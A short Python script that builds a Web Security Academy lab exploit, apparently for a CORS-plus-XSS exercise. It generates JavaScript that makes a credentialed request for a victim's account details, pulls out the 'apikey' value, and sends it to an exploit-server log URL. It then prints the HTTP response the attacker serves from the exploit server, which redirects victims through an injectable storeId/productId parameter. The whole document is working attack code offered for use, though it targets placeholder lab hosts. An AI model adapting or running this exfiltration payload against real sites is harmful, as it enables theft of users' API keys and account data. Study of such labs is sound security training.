import urllib.parse

LAB_ID = "???"
EXPLOIT_SERVER_ID = "???"
exploit = f"""
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://{LAB_ID}.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {{
        location='https://exploit-{EXPLOIT_SERVER_ID}.exploit-server.net/log?key='+JSON.parse(this.responseText)['apikey'];
    }};
</script>
""".replace("  ", "").replace("\n", "")

redirect_url = (f"http://stock.{LAB_ID}.web-security-academy.net/"
                f"?storeId=1&productId={urllib.parse.quote_plus(exploit)}")

print("exploit:")
print("file:")
print("/exploit")
print("head:")
print("""
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
""")
print("body:")
print(f"""
<script>
    window.location = "{redirect_url}";
</script>
""")
